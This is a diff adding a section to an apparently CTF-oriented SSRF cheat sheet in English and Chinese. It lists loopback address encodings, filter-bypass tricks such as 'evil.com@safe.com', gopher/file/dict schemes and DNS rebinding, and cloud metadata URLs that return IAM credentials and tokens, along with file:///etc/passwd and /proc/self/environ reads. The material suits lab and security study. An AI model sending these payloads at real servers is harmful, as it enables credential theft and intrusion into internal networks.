@@ -81,3 +81,59 @@ Use collaborator for the callback; if DNS-only, chain DNS rebinding or OOB exfil
 - **Confirm → identify filter → re-encode → escalate.** Don't stop at "SSRF confirmed" — the flag is usually one hop deeper (metadata / Redis / internal admin).
 - **gopher is the RCE enabler** — when it's allowed, SSRF stops being "read-only".
 - Self-verify each hop (callback / banner / response) before the next.
+
+## URL 解析器差异(SSRF 过滤绕过核心)
+
+不同解析器对同一 URL 的理解不同——过滤器用一个 parser 检查"安全",实际请求库用另一个 parser 发送到"危险地址":
+
+### 127.0.0.1 等价写法(逐一试)
+
+```
+http://127.0.0.1
+http://0x7f000001          # hex
+http://2130706433          # decimal
+http://0177.0.0.1          # octal
+http://127.1               # 短格式
+http://[::1]               # IPv6 loopback
+http://[::ffff:127.0.0.1]  # IPv6-mapped IPv4
+http://0                   # 某些系统=localhost
+http://localhost
+http://127.0.0.1.nip.io    # DNS 解析到 127.0.0.1
+http://spoofed.burpcollaborator.net  # DNS rebinding
+```
+
+### 过滤绕过技巧
+
+| 绕过目标 | 手法 |
+|---|---|
+| 域名黑名单 | `http://evil.com@safe.com/`(parser 差异) |
+| IP 黑名单 | hex/octal/decimal/IPv6-mapped 编码 |
+| 协议黑名单 | `gopher://` / `file:///` / `dict://` |
+| 路径黑名单 | 双 URL 编码 `%252e%252e` / `..;/` |
+| 重定向 | 你控制的 URL 302 到 `http://169.254.169.254` |
+| DNS rebinding | 第一次解析到安全 IP(通过检查),第二次解析到内网 IP(实际请求) |
+
+### 全云 metadata 端点速查
+
+```bash
+# AWS IMDSv1 (无需认证,最常考)
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+
+# GCP (需 header: Metadata-Flavor: Google)
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+
+# Azure (需 header: Metadata: true)
+http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
+
+# 阿里云 (无需认证)
+http://100.100.100.200/latest/meta-data/ram/security-credentials/
+
+# DigitalOcean (无需认证)
+http://169.254.169.254/metadata/v1/user-data
+
+# 通用内网探测
+http://127.0.0.1:PORT    # 本机其他服务
+http://内网IP:PORT       # 从报错/配置文件获取
+file:///etc/passwd       # 本地文件读取
+file:///proc/self/environ  # 环境变量(含 AK/SK)
+```
